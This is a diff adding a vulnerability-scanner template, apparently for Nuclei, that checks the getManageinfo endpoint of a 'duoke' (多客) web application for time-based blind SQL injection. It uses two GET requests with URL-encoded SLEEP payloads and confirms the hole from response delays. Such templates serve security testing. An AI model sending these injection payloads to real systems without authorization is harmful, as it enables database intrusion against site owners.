@@ -1,0 +1,22 @@
+id: duoke-getManageinfo-sql-time
+
+info:
+  name: 多客 getManageinfo SQL注入漏洞
+  author: duoke
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /api/index/quanManageList/getManageinfo?id=1%29+AND+%28SELECT+8888+FROM+%28SELECT%28SLEEP%284%29%29%29qBqH%29+AND+%288888%3D888 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /api/index/quanManageList/getManageinfo?id=1%29+AND+%28SELECT+8888+FROM+%28SELECT%28SLEEP%288%29%29%29qBqH%29+AND+%288888%3D888 HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
